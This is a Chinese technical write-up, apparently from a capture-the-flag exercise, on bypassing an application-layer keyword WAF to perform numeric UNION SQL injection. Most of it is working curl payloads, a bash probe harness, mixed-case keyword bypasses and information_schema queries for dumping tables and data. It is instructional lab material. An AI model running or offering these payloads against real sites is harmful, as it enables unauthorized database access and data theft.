# 技术笔记：应用层关键词 WAF 下的数字型 UNION 注入

## 什么时候用

看到下面这些特征就可以按本笔记走：

- 表单提交后回显为**结构化多行表格**（模板渲染的 `<table>`，列头固定），改一个参数值，表格在「有行 / 无行」之间跳变 —— 典型布尔型注入。
- 判错时页面**分区**显示不同提示：一类是「请求已被 WAF 拦截」（红块，HTML 里通常是 `.blocked` 之类的 class），另一类是「查询失败」（黄块，`.error`）。**两类提示必须能区分**，否则无法判定绕过是否成功。
- 服务端指纹像 Flask/gunicorn 之类轻量 Python 框架 —— 这类 WAF 往往是应用层几十行子串匹配，而不是 ModSecurity/云 WAF 的规则集。
- 参数是**数字型**：`1 and 1=1` 直接生效，无需闭合引号。

## 怎么做

**1. 先拿基线页，别猜参数名。** 抓首页存盘，从表单里读 `action`/`method`/`name`：

```bash
TARGET=http://HOST:PORT/
curl -s -X POST --data-raw "id=1" "$TARGET" -o base.html
grep -o '<form[^>]*>' base.html
```

**2. 布尔对照定注入点。**

```bash
curl -s -X POST --data-raw "id=1 and 1=1" "$TARGET" | grep -c '<tr>'
curl -s -X POST --data-raw "id=1 and 1=2" "$TARGET" | grep -c '<tr>'
```
两者行数不同 → 确认为可注入且为数字型。

**3. 用 `order by` 递增定列数。** 从 1 往上加，直到响应从「正常」跳到「查询失败」；前一个 N 即列数（本次为 4 列）。

**4. WAF 差分测试：每次只改一个维度。** 先故意用小写关键字触发一次，把三种响应分类固化成脚本，后面所有变体都只看输出类别：

```bash
classify() {                       # 0=WAF 1=DB 错误 2=正常
  grep -q 'WAF'  /tmp/o.html && { echo WAF;  return; }
  grep -q '查询失败' /tmp/o.html && { echo DBERR; return; }
  echo OK
}
probe() { curl -s -X POST --data-raw "id=$1" "$TARGET" -o /tmp/o.html; classify "$1"; }

probe "1 union select 1,2,3,4"          # 期望 WAF —— 确认规则命中
probe "0 UnIoN SeLeCt 1,2,3,4"          # 期望 OK   —— 大小写混写
probe "0 union/**/select 1,2,3,4"       # 本次实测 WAF
probe "0%09union%09select 1,2,3,4"      # 本次实测 WAF
probe "0 %75nion %73elect 1,2,3,4"      # 单层百分号编码，本次实测 WAF
```
判定标准：**必须返回 OK/DBERR 而不是 WAF**，才算绕过；返回 DBERR 只说明语法有问题，不算绕过成功。
本次唯一验证有效的变体是**关键字大小写混写**；关键字替换（`FrOm`/`WhErE`）沿用同一手法也有效。

**5. 用不存在的 id 做 UNION 回显位。** 用 `id=0` 而不是 `id=1`，否则原记录会混进表格，看起来像「没注入」：

```bash
curl -s -X POST --data-raw "id=0 UnIoN SeLeCt 1,database(),version(),current_user()" "$TARGET"
```

**6. 枚举元数据，逐步收敛。**

```bash
# 表
... "id=0 UnIoN SeLeCt 1,group_concat(table_name),3,4 FrOm information_schema.tables WhErE table_schema=database()"
# 列（同时带出所属表名，便于对应）
... "id=0 UnIoN SeLeCt 1,group_concat(column_name),table_name,4 FrOm information_schema.columns WhErE table_schema=database()"
# 取目标
... "id=0 UnIoN SeLeCt 1,<目标列>,3,4 FrOm <目标表>"
```
数据一般能整段塞进一个回显列（`group_concat` 足够时无需盲注）。

## 坑

- **不要因为 `/**/` 能拆关键字就认定 WAF 只做朴素子串匹配**，进而跳过测试。本次 `/**/`、`%09`、multipart/form-data 全部被拦，说明它在匹配前做了注释/空白归一化，或规则集覆盖了这些形式。结论要靠 `classify` 的差分输出来定，不靠直觉。
- **不要把「查询失败」当成「被 WAF 拦截」。** 两者是两个不同的提示块，混淆会同时误判列数和绕过是否成功 —— 报错注入之类也会落到「查询失败」。
- **不要在 URL 里直接拼带空格的 payload。** 本次成功路径是 `--data-raw`（body 原样发送）；`--data-urlencode` 会把空格编码，改变 WAF 看到的字节序列。
- **不要用 `id=1` 做 UNION 回显**，原结果集会混进表格，掩盖注入成功与否。
- **题面给的路径 404 不代表站点挂了。** 本次题面写 `/sql绕过` 返回 404，真实入口是根路径 `/`；先访问根路径、看首页表单再决定打哪里。

## 边界

- 仅验证了**数字型**注入；字符串型需要自行闭合引号，布尔对照的写法要相应调整。
- 列数（本次 4 列）与目标无关，换题必须重新 `order by` 测。
- 本次 WAF 是应用层的大小写敏感子串匹配；换成真实 WAF 产品时大小写混写大概率失效，需要重新做差分测试（注释、编码叠加、参数污染、分块传输等都属未验证方向）。
- 依赖数据库账户能读 `information_schema`（本次账户权限足够）；低权限态需退回盲注。
- 表名/库名在 Linux 下的大小写敏感性未做验证，`database()` 与 `information_schema` 查询写法按实测原样使用。
